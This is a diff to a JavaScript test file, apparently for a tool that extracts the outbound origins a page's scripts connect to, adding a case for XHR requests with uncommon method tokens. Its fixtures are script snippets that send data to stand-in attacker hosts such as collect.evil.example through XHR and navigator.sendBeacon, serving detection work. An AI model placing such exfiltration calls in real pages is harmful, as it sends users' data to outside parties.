@@ -39,6 +39,10 @@ describe('A05-07 APPS-007 sees more connect and resource loads', () => {
     expect(origins('<script>x.open("POST","https://collect.evil.example/c");y.open(\'put\', "https://p.evil.example/u")</script>'))
       .toEqual(['connect https://collect.evil.example', 'connect https://p.evil.example']);
   });
+  it('XHR open with any method token, not only the seven common ones (review R110-Q1-05)', () => {
+    expect(origins('<script>x.open("PROPFIND","https://dav.evil.example/d");y.open(\'REPORT\', "https://r.evil.example/")</script>'))
+      .toEqual(['connect https://dav.evil.example', 'connect https://r.evil.example']);
+  });
   it('navigator.sendBeacon', () => {
     expect(origins('<script>navigator.sendBeacon("https://collect.evil.example/b", d)</script>')).toEqual(['connect https://collect.evil.example']);
   });
